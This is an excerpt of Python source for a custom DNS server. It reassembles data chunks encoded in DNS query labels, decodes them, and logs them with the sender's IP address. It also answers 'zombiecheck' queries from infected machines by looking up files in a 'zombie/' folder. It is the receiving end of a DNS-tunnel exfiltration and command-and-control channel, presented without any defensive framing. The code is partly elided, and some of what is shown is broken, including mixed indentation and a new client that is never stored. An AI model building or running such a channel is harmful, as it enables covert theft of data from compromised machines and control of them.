...
class resolverHelpers:
    ...
    def getClient(self, messageID, totalMessages):
        if(len(clientList)==0):
            messageArray = [[None]] * (int(totalMessages)+1)
            clientList.append({"id" : messageID, "messages" : messageArray})
            return clientList[0]
        else:
            for client in clientList:
                if(client.get("id") == messageID):
                    return client
            messageArray = [[None]] * (int(totalMessages)+1)
            newClient = {"id" : messageID, "messages" : messageArray}
    ...
    def checkMessages(self, client):
        messages = client.get("messages")
        index = 0
        for m in messages:
            if(m == [None]):
                return "10.10.10." + str(index)
            index = index+1


class customResolver:
    global util
    util = resolverHelpers()
    def resolve(self,request,handler):
	    domain = "ourdomain"
        req = request.q.qname.label
        print(len(req))
        if(len(req) == 5 and req[3] == domain):
            totalMessages = int(req[0].split("-")[1])
            messageNo = int(req[0].split("-")[0])
            print(req[2])
            client = util.getClient(req[2], totalMessages)
            client.get("messages")[messageNo] = util.replaceBadChars(req[1])
            util.updateClient(client)
            if(messageNo == totalMessages):
                print(util.decodeMessage(client, handler.client_address[0]))
            reply = request.reply()
            reply.add_answer(RR(".".join(req)+".",QTYPE.A,rdata=A("1.2.3.4"),ttl=60))
            return reply
        elif(len(req) == 4 and req[2] == domain):
            print("zombiecheck")
            pcname = req[0]
            reply = request.reply()
            if(os.path.isfile("zombie/" + pcname)):
                reply.add_answer(RR(".".join(req)+".",QTYPE.A,rdata=A("10.10.10.4"),ttl=60))
                return reply
            else:
                reply.add_answer(RR(".".join(req),QTYPE.A,rdata=A("1.2.3.4"),ttl=60))
                return reply
            ...
            print(req[3])
            reply = request.reply()
            reply.add_answer(RR("abc.com",QTYPE.A,rdata=A("1.2.3.4"),ttl=60))
            return reply

if __name__ == "__main__":
    resolver = customResolver()
    server = DNSServer(resolver,address="0.0.0.0")
    server.start()
